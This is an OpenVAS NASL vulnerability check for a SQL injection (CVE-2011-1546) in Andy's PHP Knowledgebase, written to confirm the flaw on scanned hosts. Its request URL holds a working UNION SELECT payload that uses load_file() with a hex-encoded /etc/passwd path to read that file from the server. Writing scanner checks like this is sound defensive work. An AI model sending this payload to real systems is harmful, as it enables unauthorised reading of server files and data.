###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_aphpkb_47097.nasl 12878 2018-12-21 17:31:30Z cfischer $
#
# Andy's PHP Knowledgebase 's' Parameter SQL Injection Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:aphpkb:aphpkb";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103135");
  script_version("$Revision: 12878 $");
  script_tag(name:"last_modification", value:"$Date: 2018-12-21 18:31:30 +0100 (Fri, 21 Dec 2018) $");
  script_tag(name:"creation_date", value:"2011-03-31 17:03:50 +0200 (Thu, 31 Mar 2011)");
  script_bugtraq_id(47097);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2011-1546");
  script_name("Andy's PHP Knowledgebase 's' Parameter SQL Injection Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("secpod_aphpkb_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("aphpkb/installed");

  script_xref(name:"URL", value:"https://www.securityfocus.com/bid/47097");
  script_xref(name:"URL", value:"http://aphpkb.sourceforge.net/");

  script_tag(name:"solution", value:"Updates are available. Please contact the vendor for more information.");

  script_tag(name:"summary", value:"Andy's PHP Knowledgebase is prone to an SQL-injection vulnerability
  because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.");

  script_tag(name:"impact", value:"Exploiting this issue could allow an attacker to compromise the
  application, access or modify data, or exploit latent vulnerabilities in the underlying database.");

  script_tag(name:"affected", value:"Andy's PHP Knowledgebase 0.95.2 is vulnerable. Other versions may also
  be affected.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = string(dir, "/a_viewusers.php?s=1+UNION+SELECT+load_file(0x2f6574632f706173737764),null,null,null,null,null,null+limit+0");

if(http_vuln_check(port:port, url:url, pattern:"root:.*:0:[01]:")) {
  report = report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);